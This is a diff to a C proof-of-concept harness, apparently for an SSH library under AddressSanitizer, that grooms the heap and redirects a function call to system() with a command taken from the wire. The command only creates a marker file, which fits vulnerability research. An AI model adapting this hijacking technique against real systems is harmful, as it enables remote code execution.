@@ -60,7 +60,7 @@ static const char g_realsystem_cmd[] =
  * app-owned static command string. Still ASLR-local for &system. */
 static int g_wirecmd = 0;
 static const char g_wirecmd_cmd[] = "touch evidence-wire-wirecmd.marker";
-#define WIRECMD_CHUNK 0x50c00001c480ULL
+static uint64_t g_wirecmd_chunk = 0x50c00001c480ULL;
 #define WIRECMD_CMD_OFF 8
 #endif
 #endif
@@ -448,7 +448,7 @@ static int run_client(void)
             }
 #ifdef W16_WIRECMD
             if (g_wirecmd) {
-                uint64_t sess = WIRECMD_CHUNK + WIRECMD_CMD_OFF;
+                uint64_t sess = g_wirecmd_chunk + WIRECMD_CMD_OFF;
                 fn = g_bad_call ? 0x4141414141414141ull :
                      (uint64_t)(uintptr_t)&system;
                 memcpy(payload + WIRECMD_CMD_OFF, g_wirecmd_cmd,
@@ -526,13 +526,13 @@ int main(int argc, char **argv)
     __asan_set_death_callback(asan_death);
     ssh_init();
     pid_t pid;
-#ifdef W12_FIXEDADDR
+#if defined(W12_FIXEDADDR) || defined(W16_WIRECMD)
     if (argc < 2 || argc > 4) {
 #else
     if (argc < 2 || argc > 3) {
 #endif
         fprintf(stderr,
-#ifdef W12_FIXEDADDR
+#if defined(W12_FIXEDADDR) || defined(W16_WIRECMD)
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare|groom-fixedaddr|client-only FN_ADDR|server-only|server-fixedaddr FN_ADDR]\n",
 #elif !defined(W14_REALSYSTEM)
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare]\n",
@@ -565,6 +565,14 @@ int main(int argc, char **argv)
         g_fixedaddr = 1;
         g_fixed_fn = strtoull(argv[3], NULL, 0);
         return run_server(argv[1]);
+    }
+#endif
+#ifdef W16_WIRECMD
+    /* Driver-supplied ASan slot, discovered from a probe run in this build.
+     * A hard-coded slot is not reproducible: the allocator layout shifts with
+     * the build path and harness text. */
+    if (argc >= 4 && strncmp(argv[3], "0x", 2) == 0) {
+        g_wirecmd_chunk = strtoull(argv[3], NULL, 16);
     }
 #endif
     if (argc == 3 && strcmp(argv[2], "data-only") == 0) {
@@ -615,13 +623,13 @@ int main(int argc, char **argv)
         g_realsystem = 1;
         g_bad_call = 1;
 #ifdef W16_WIRECMD
-    } else if (argc == 3 && strcmp(argv[2], "groom-wirecmd") == 0) {
+    } else if (argc >= 3 && strcmp(argv[2], "groom-wirecmd") == 0) {
         g_groom = 1;
         g_survive = 1;
         g_call = 1;
         g_realsystem = 1;
         g_wirecmd = 1;
-    } else if (argc == 3 && strcmp(argv[2], "groom-wirecmd-bad") == 0) {
+    } else if (argc >= 3 && strcmp(argv[2], "groom-wirecmd-bad") == 0) {
         g_groom = 1;
         g_survive = 1;
         g_call = 1;
